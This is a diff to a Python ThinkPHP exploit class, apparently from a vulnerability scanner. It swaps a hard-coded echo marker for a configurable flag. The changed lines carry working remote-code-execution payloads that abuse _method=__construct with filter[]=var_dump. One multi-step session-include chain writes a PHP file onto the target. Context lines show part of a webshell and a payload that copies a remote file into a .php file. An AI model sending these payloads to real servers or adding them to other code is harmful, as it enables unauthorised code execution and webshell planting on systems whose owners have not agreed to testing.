@@ -24,6 +24,7 @@ class ThinkPHP():
         self.timeout = env.get('timeout')
         self.retry_time = env.get('retry_time')
         self.retry_interval = env.get('retry_interval')
+        self.flag = GlobalVar.get_value('flag')
         self.webshell = '''
         <?php
         @error_reporting(0);
@@ -56,7 +57,6 @@ class ThinkPHP():
         assert -> <?php copy("http://127.0.0.1/helloword.txt", "helloword.php");?>
         file_put_contents -> vars[1][0]=helloword.php&vars[1][1]=helloword
         '''
-        
     #ThinkPHP3
     def tp3_select_find_delete_sql(self):
         appName = 'ThinkPHP'
@@ -169,7 +169,7 @@ class ThinkPHP():
         path = '/index.php?s=captcha'
         method = 'post'
         desc = '[rce]'
-        data = '_method=__construct&filter[]=var_dump&method=GET&server[REQUEST_METHOD]=VuLnEcHoPoCSuCCeSS'
+        data = '_method=__construct&filter[]=var_dump&method=GET&server[REQUEST_METHOD]={}'.format(self.flag)
         headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
         #输出类
         output = Output(self.url, appName, pocname)
@@ -178,7 +178,7 @@ class ThinkPHP():
         try:
             if self.vuln == 'False':
                 r = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
-                if "string(5) \"VuLnEcHoPoCSuCCeSS\"" in r.text:
+                if "string(5) \"{}\"".format(self.flag) in r.text:
                     
                     return output.no_echo_success(method, desc)
                 else:
@@ -195,7 +195,7 @@ class ThinkPHP():
         path = '/index.php?s=captcha'
         method = 'post'
         desc = '[rce]'
-        data = '_method=__construct&method=GET&filter[]=var_dump&get[]=VuLnEcHoPoCSuCCeSS'
+        data = '_method=__construct&method=GET&filter[]=var_dump&get[]={}'.format(self.flag)
         headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
         #输出类
         output = Output(self.url, appName, pocname)
@@ -204,7 +204,7 @@ class ThinkPHP():
         try:
             if self.vuln == 'False':
                 r = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
-                if "string(5) \"VuLnEcHoPoCSuCCeSS\"" in r.text:
+                if "string(5) \"{}\"".format(self.flag) in r.text:
                     
                     return output.no_echo_success(method, desc)
                 else:
@@ -221,7 +221,7 @@ class ThinkPHP():
         path = '/index.php?s=captcha'
         method = 'post'
         desc = '[rce]'
-        data = 's=VuLnEcHoPoCSuCCeSS&_method=__construct&method=POST&filter[]=var_dump'
+        data = 's={}&_method=__construct&method=POST&filter[]=var_dump'.format(self.flag)
         headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
         #输出类
         output = Output(self.url, appName, pocname)
@@ -230,7 +230,7 @@ class ThinkPHP():
         try:
             if self.vuln == 'False':
                 r = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
-                if "string(5) \"VuLnEcHoPoCSuCCeSS\"" in r.text:
+                if "string(5) \"{}\"".format(self.flag) in r.text:
                     
                     return output.no_echo_success(method, desc)
                 else:
@@ -247,7 +247,7 @@ class ThinkPHP():
         path = '/index.php?s=captcha'
         method = 'post'
         desc = '[rce]'
-        data = 'aaaa=VuLnEcHoPoCSuCCeSS&_method=__construct&method=GET&filter[]=var_dump'
+        data = 'aaaa={}&_method=__construct&method=GET&filter[]=var_dump'.format(self.flag)
         headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
         #输出类
         output = Output(self.url, appName, pocname)
@@ -256,7 +256,7 @@ class ThinkPHP():
         try:
             if self.vuln == 'False':
                 r = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
-                if "string(5) \"VuLnEcHoPoCSuCCeSS\"" in r.text:
+                if "string(5) \"{}\"".format(self.flag) in r.text:
                     
                     return output.no_echo_success(method, desc)
                 else:
@@ -300,7 +300,7 @@ class ThinkPHP():
         path = '/index.php?s=index/index/index'
         method = 'post'
         desc = '[rce]'
-        data = 's=VuLnEcHoPoCSuCCeSS&_method=__construct&method&filter[]=var_dump'
+        data = 's={}&_method=__construct&method&filter[]=var_dump'.format(self.flag)
         headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
         #输出类
         output = Output(self.url, appName, pocname)
@@ -309,7 +309,7 @@ class ThinkPHP():
         try:
             if self.vuln == 'False':
                 r = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
-                if r"string(18) \"VuLnEcHoPoCSuCCeSS\"" in r.text:
+                if "string(18) \"{}\"".format(self.flag) in r.text:
                     
                     return output.no_echo_success(method, desc)
                 else:
@@ -364,7 +364,7 @@ class ThinkPHP():
         path = '/index.php'
         method = 'post'
         desc = '[rce]'
-        data = '_method=__construct&filter[]=var_dump&server[REQUEST_METHOD]=VuLnEcHoPoCSuCCeSS'
+        data = '_method=__construct&filter[]=var_dump&server[REQUEST_METHOD]={}'.format(self.flag)
         headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
         #输出类
         output = Output(self.url, appName, pocname)
@@ -373,7 +373,7 @@ class ThinkPHP():
         try:
             if self.vuln == 'False':
                 r = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
-                if "string(5) \"VuLnEcHoPoCSuCCeSS\"" in r.text:
+                if "string(5) \"{}\"".format(self.flag) in r.text:
                     
                     return output.no_echo_success(method, desc)
                 else:
@@ -718,7 +718,7 @@ class ThinkPHP():
         scriptname = random_name(6)+'.php'
         path1 = '/index.php?s=captcha'
         path2 = scriptname
-        vulntxt = 'VuLnEcHoPoCSuCCeSS'
+        vulntxt = self.flag
         payload = "<?php+$a='file_put_contents';$b='base64_decode';$a($b('{}'),$b('{}'),FILE_APPEND);?>".format(base64.b64encode(scriptname.encode()).decode(),quote(base64.b64encode(vulntxt.encode()).decode(),'utf-8'))
         post_param1 = r"_method=__construct&filter[]=think\Session::set&method=get&get[]={random}&server[]=1"
         post_param2 = r"_method=__construct&method=GET&filter[]=think\__include_file&get[]=/tmp/sess_{random}&server[]=1"
@@ -739,7 +739,7 @@ class ThinkPHP():
                 r = exprequest.post(self.url+path1, data=post_param1.replace(r'{random}',payload), headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                 r = exprequest.post(self.url+path1, data=post_param2.replace(r'{random}',PHPSESSID), headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                 r = exprequest.get(self.url+'/'+path2, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
-                if "VuLnEcHoPoCSuCCeSS" in r.text:
+                if self.flag in r.text:
                     return output.no_echo_success(method, desc)
                 else:
                     return output.fail()
